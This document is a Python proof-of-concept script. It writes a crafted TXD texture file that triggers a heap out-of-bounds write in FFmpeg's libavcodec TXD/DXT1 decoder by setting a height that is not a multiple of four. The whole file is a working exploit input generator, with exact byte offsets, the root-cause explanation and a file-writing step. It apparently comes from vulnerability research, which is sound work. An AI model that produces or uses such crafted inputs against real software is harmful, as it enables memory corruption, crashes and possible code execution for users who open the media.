#!/usr/bin/env python3
"""
VULN 001: Heap OOB Write in DXT1 Decode for Non-Multiple-of-4 Height
File: libavcodec/txd.c (txd_decode_frame -> dxt1_block_internal)

Root cause:
  ff_get_buffer allocates exactly linesize * h rows for RGBA.
  dxt1_block always writes 4 rows per 4x4 block.
  With h=1 (not divisible by 4), 3 extra rows are written past the buffer end.

Trigger: width=4, height=1 (not divisible by 4), depth=16, d3d_format=DXT1
"""

import struct
import os

# TXD RenderWare section IDs and marker
TXD_FILE    = 0x16   # outer container
TXD_INFO    = 0x01   # data chunk that becomes AVPacket
TXD_MARKER  = 0x1803ffff  # version marker accepted by demuxer

# --- Build the native texture payload (AVPacket data) ---
#
# txd_decode_frame reads:
#   offset 0-3:   version/platform_id (le32) - must be 8 or 9
#   offset 4-75:  skipped 72 bytes (filter_flags[4]+name[32]+mask[32]+raster_format[4])
#   offset 76-79: d3d_format (le32)
#   offset 80-81: width (le16)
#   offset 82-83: height (le16)  <-- set to 1 (not divisible by 4)
#   offset 84:    depth (byte)   <-- 0x10 = 16 -> enters DXT path
#   offset 85-86: skipped 2 bytes (num_levels, tex_type)
#   offset 87:    flags (byte)
#   --- decoder then does bytestream2_skip(&gb, 4) for data_size ---
#   offset 88-91: data_size (le32) = 8
#   offset 92-99: DXT1 block data (8 bytes, one 4x4 block)
#   offset 100:   padding byte (needed to satisfy demuxer chunk_size > 100)

version      = 9                 # D3D9 platform
filter_flags = 0x00001102
name_field   = b"test\x00" + b"\x00" * 27   # 32 bytes
mask_field   = b"\x00" * 32
raster_fmt   = 0x00000500        # RASTER_DEFAULT | RASTER_TYPE_NORMAL
d3d_format   = 0x31545844        # "DXT1"
width        = 4
height       = 1                 # NOT divisible by 4 -> triggers OOB write
depth        = 0x10              # 16-bit depth -> DXT path
num_levels   = 1
tex_type     = 4                 # DXT compressed texture type
flags        = 1                 # compression flag (checked for d3d_format==0 case)
data_size    = 8

# One valid DXT1 block (4x4 pixels):
#   color0=0xffff (white RGB565), color1=0x0000 (black RGB565)
#   indices=0xffffffff (all 16 pixels use color1)
dxt1_block   = b'\xff\xff\x00\x00\xff\xff\xff\xff'

# Assemble the packet payload (88-byte header + 4-byte data_size + 8-byte DXT1 + 1 padding)
payload  = struct.pack('<I', version)        # offset 0-3
payload += struct.pack('<I', filter_flags)   # offset 4-7
payload += name_field                        # offset 8-39
payload += mask_field                        # offset 40-71
payload += struct.pack('<I', raster_fmt)     # offset 72-75
payload += struct.pack('<I', d3d_format)     # offset 76-79
payload += struct.pack('<H', width)          # offset 80-81
payload += struct.pack('<H', height)         # offset 82-83
payload += struct.pack('B', depth)           # offset 84
payload += struct.pack('B', num_levels)      # offset 85
payload += struct.pack('B', tex_type)        # offset 86
payload += struct.pack('B', flags)           # offset 87
payload += struct.pack('<I', data_size)      # offset 88-91
payload += dxt1_block                        # offset 92-99
payload += b'\x00'                           # offset 100: padding (makes chunk_size=101 > 100)

assert len(payload) == 101, f"expected 101 bytes, got {len(payload)}"

# --- Build the RenderWare TXD container ---
#
# Demuxer (libavformat/txd.c) parses sections as:
#   [type:u32le][chunk_size:u32le][marker:u32le][data:chunk_size bytes]
#
# Navigation logic:
#   TXD_FILE (0x16):    goto next_chunk (no data skip - acts as container)
#   TXD_INFO (0x01):    if chunk_size > 100: break -> av_get_packet reads chunk_size bytes
#                       if chunk_size <= 100: skip data, goto next_chunk
#   default:            error
#
# Probe checks bytes[0:4] == TXD_FILE and bytes[8:12] == TXD_MARKER or TXD_MARKER2
#
# Structure:
#   [TXD_FILE header (12 bytes)]   <- probe reads this
#   [TXD_INFO header (12 bytes)]   <- demuxer reads after TXD_FILE (no skip between them)
#   [payload (101 bytes)]          <- becomes AVPacket data

def make_section_header(type_id, chunk_size):
    return struct.pack('<III', type_id, chunk_size, TXD_MARKER)

# TXD_FILE header: size field covers the rest of the file after this header
inner_size = 12 + len(payload)  # TXD_INFO header + payload
txd_file_hdr = make_section_header(TXD_FILE, inner_size)

# TXD_INFO header: chunk_size = 101 > 100, so demuxer calls av_get_packet
txd_info_hdr = make_section_header(TXD_INFO, len(payload))

txd_file = txd_file_hdr + txd_info_hdr + payload

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.txd")
with open(out_path, 'wb') as f:
    f.write(txd_file)

print(f"[+] Written {len(txd_file)} bytes to {out_path}")
print(f"[+] Probe check: type=0x{int.from_bytes(txd_file[0:4], 'little'):08x}, marker=0x{int.from_bytes(txd_file[8:12], 'little'):08x}")
print(f"[+] Payload: width={width}, height={height}, depth={depth}, d3d_format=0x{d3d_format:08x}")
print(f"[+] Expected: dxt1_block writes 4 rows, buffer only has {height} row(s) -> OOB write")
